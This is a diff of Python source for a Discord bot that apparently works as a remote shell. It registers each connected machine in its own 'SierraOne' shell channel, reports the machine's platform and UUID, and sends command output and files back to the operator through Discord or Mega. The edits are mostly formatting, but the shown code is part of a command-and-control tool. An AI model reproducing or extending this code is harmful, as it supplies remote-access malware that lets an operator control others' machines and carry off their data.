@@ -10,14 +10,12 @@ from sys import exit
 
 
 TEXT_SIZE_MAX = 1992
-CHUNKED_TEXT_SIZE_MAX = TEXT_SIZE_MAX * 4
+CHUNKED_TEXT_SIZE_MAX = 4 * TEXT_SIZE_MAX
 TEXT_CHUNK_SIZE = TEXT_SIZE_MAX
 
 FILE_SIZE_MAX = 7864320
 CHUNKED_FILE_SIZE_MAX = 4 * FILE_SIZE_MAX
 MEGA_SIZE_MAX = 110100480
-
-
 
 bot = commands.Bot(command_prefix=".")
 channel = None
@@ -53,22 +51,21 @@ async def on_ready():
         await channel.send(
             "**WARNING**\nMega credentials were not found. "
             "All your uploads larger than 7.5 MB will be "
-            "split into chunks and uploaded over Discord."
-            )
-
+            "split into chunks and uploaded over Discord.")
 
     else:
         await channel.send(
             "Mega credentials found. All your uploads larger "
-            "than 7.5 MB will be uploaded to Mega."
-            )
+            "than 7.5 MB will be uploaded to Mega.")
 
 
 # Create 'SierraOne' category
 async def create_category(guild):
     category = discord.utils.get(guild.categories, name=category_prefix)
+
     if not category:
         category = await guild.create_category(category_prefix)
+
     return category
 
 
@@ -93,7 +90,6 @@ async def next_channel(channels):
 
                 if channel_number.isdigit():
                     numbers.append(int(channel_number))
-
 
         shell_number = max(numbers) + 1
 
@@ -130,7 +126,6 @@ async def machine_info():
                                          "-F",
                                          "'/IOPlatformUUID/{print $(NF-1)}'"]))
 
-
     else:
         machine_UUID = str("Unknown")
 
@@ -141,7 +136,6 @@ async def machine_info():
     # Non-embed alternative
     # message = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."
     return embedded
-
 
 
 @bot.event
@@ -211,11 +205,6 @@ async def upload(filename):
         else:
             await channel.send("File is too big")
 
-    try:
-        filesize = os.path.getsize(filename)
-    except FileNotFoundError:
-        await channel.send("File not found")
-        return
 
 async def upload_chunks_from_memory(data):
     await channel.send("Splitting output and uploading chunks as "
@@ -238,6 +227,8 @@ async def upload_from_memory(data, n):
     if n <= FILE_SIZE_MAX:
 
         filename = "output.txt"
+        await channel.send("Output is too large. As a result, "
+                           f"your output will be sent as {filename}")
         await channel.send(file=discord.File(BytesIO(data),
                                              filename=filename))
     
@@ -283,8 +274,6 @@ async def handle_user_input(content):
             await channel.send(f"{page}")
     
     elif CHUNKED_TEXT_SIZE_MAX < output_length <= CHUNKED_FILE_SIZE_MAX:
-        await channel.send("Output is too large. As a result, "
-                           f"your output will be sent as {filename}")
         await upload_from_memory(user_input.encode("utf-8", "ignore"),
                                  output_length)
 
